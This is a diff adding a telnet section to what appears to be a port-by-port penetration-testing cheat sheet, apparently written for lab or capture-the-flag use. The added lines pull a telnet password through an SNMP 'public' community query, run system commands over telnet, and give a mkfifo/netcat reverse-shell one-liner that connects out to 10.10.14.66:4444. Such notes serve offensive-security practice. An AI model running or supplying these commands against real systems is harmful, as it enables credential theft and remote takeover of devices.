@@ -24,6 +24,16 @@
   ## port 23
   ### Nmap commands
     nmap -n -sV -Pn --script "*telnet* and safe" -p 23 <ip>
+   ###  Getting telnet passwd
+    snmpget -v 1 -c public 192.168.2.46 .1.3.6.1.4.1.11.2.3.9.1.1.13.0
+   ####  telnet commads
+     use ? for help
+   #####  system command 
+     > exec id
+        uid=7(lp) gid=7(lp) groups=7(lp),19(lpadmin)
+     > exec rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.66 4444 >/tmp/f    --Getting reverse shell
+
+
  
 ## port 25
 ### nmap command
